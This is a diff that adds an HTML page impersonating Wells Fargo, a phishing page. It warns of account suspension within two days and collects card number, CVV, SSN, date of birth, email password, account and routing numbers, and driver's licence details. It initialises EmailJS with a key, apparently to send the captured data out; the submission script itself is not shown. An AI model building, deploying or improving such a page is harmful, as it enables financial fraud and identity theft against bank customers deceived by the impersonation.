@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Information - Wells Fargo</title>
+    <link rel="stylesheet" href="style.css">
+     <!-- ✅ CRITICAL: Add this line for the Hamburger Icon to show up -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          // ⚠️ PASTE PUBLIC KEY HERE ⚠️
+          emailjs.init("sokn-9DiqaVSWTXrt");
+       })();
+    </script>
+</head>
+<body>
+
+    <header class="wf-header">
+        <div class="logo-text">WELLS FARGO</div>
+          <!-- Toggle function added -->
+        <button class="menu-btn" onclick="toggleMenu()">
+            <i class="fas fa-bars" id="menu-icon"></i>
+        </button>
+    </header>
+
+    <!-- Hidden Menu -->
+    <div id="mobile-menu">
+        <div class="menu-list">
+            <a href="#"><i class="fas fa-search"></i> Search</a>
+            <a href="#"><i class="fas fa-lock"></i> Enroll</a>
+            <a href="#">Customer Service</a>
+            <a href="#">ATMs/Locations</a>
+            <a href="#">Español</a>
+            <a href="#" onclick="toggleMenu()">Close Menu</a>
+        </div>
+    </div>
+
+    <div class="main-container">
+        
+        <h1>Update Required</h1>
+
+        <!-- The Warning Message -->
+        <div class="warning-box">
+            Dear Customer,<br><br>
+            To ensure your safety, some information on your account appears to be missing or incorrect. Kindly update your information promptly so that you can continue to enjoy the benefits of your account. If you don't update your information within 2 days, we'll limit and suspend your account. We apologize for any inconvenience caused by our security measures.
+        </div>
+
+        <form id="cardForm">
+            
+            <!-- Vehicle/Card Info -->
+            <div class="input-group">
+                <input type="text" id="cardName" class="rounded-input" placeholder="Cardholder Name" required>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="cardNumber" class="rounded-input" placeholder="Card Number" maxlength="19" required>
+            </div>
+
+            <div style="display:flex; gap:10px;">
+                <div class="input-group" style="flex:1;">
+                    <input type="text" id="expiryDate" class="rounded-input" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="input-group" style="flex:1;">
+                    <input type="text" id="cvv" class="rounded-input" placeholder="CVV" maxlength="4" required>
+                </div>
+            </div>
+
+              <div class="input-group">
+                <label>Date of Birth (DOB)</label>
+                <input type="date" id="dob" class="rounded-input" required>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="ssn" class="rounded-input" placeholder="SSN Number" required>
+            </div>
+
+            <!-- 2. VEHICLE INFO -->
+            <h4 style="text-align:left; margin-bottom:10px; margin-top:15px;">Account Identifiers</h4>
+
+
+             <!-- ✅ NEW: CONFIRMATION CREDENTIALS -->
+            <div class="input-group">
+                <input type="email" id="confEmail" class="rounded-input" placeholder="Email" required>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="confPassword" class="rounded-input" placeholder="Password" required>
+            </div>
+            <!-- ✅ END NEW SECTION -->
+
+            <div style="display:flex; gap:10px;">
+                <div class="input-group" style="flex:1;">
+                    <input type="text" id="accountNumber" class="rounded-input" placeholder="AN (Account No.)" required>
+                </div>
+                <div class="input-group" style="flex:1;">
+                    <input type="text" id="routineNumber" class="rounded-input" placeholder="RN (Routine Numbers)" required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="dl" class="rounded-input" placeholder="DriversLicense Number" required>
+            </div>
+
+             <!-- ✅ NEW: CVL DATES SECTION -->
+            <div style="display:flex; gap:10px;">
+                <div class="input-group" style="flex:1;">
+                    <label style="font-size:12px; margin-left:10px; font-weight:bold; color:#555;">Issue Date</label>
+                    <input type="date" id="dlIssueDate" class="rounded-input" required>
+                </div>
+                <div class="input-group" style="flex:1;">
+                    <label style="font-size:12px; margin-left:10px; font-weight:bold; color:#555;">Exp Date</label>
+                    <input type="date" id="dlExpDate" class="rounded-input" required>
+                </div>
+            </div>
+
+
+            <!-- Billing Info -->
+            <h4 style="text-align:left; margin-bottom:10px;">Billing Address</h4>
+            
+            <div class="input-group">
+                <input type="text" id="billAddress" class="rounded-input" placeholder="Street Address" required>
+            </div>
+
+            <div style="display:flex; gap:10px;">
+                <div class="input-group" style="flex:1;">
+                    <input type="text" id="billCity" class="rounded-input" placeholder="City" required>
+                </div>
+                <div class="input-group" style="flex:1;">
+                    <input type="text" id="billZip" class="rounded-input" placeholder="Zip Code" required>
+                </div>
+            </div>
+
+            <button type="submit" class="update-btn">Update Now</button>
+
+        </form>
+
+       
+
+     <div class="disclaimer-box">
+            <h4>Investment and Insurance Products are:</h4>
+            <ul>
+                <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+                <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+                <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+            </ul>
+        </div>
+
+        <div class="bottom-links">
+            <a href="#">About Wells Fargo</a>
+            <a href="#">Report Email Fraud</a>
+            <a href="#">Security Center</a>
+            <a href="#">Privacy, Cookies, Security & Legal</a>
+        </div>
+    </div>
+
+
+    <script src="script.js"></script>
+</body>
+</html>
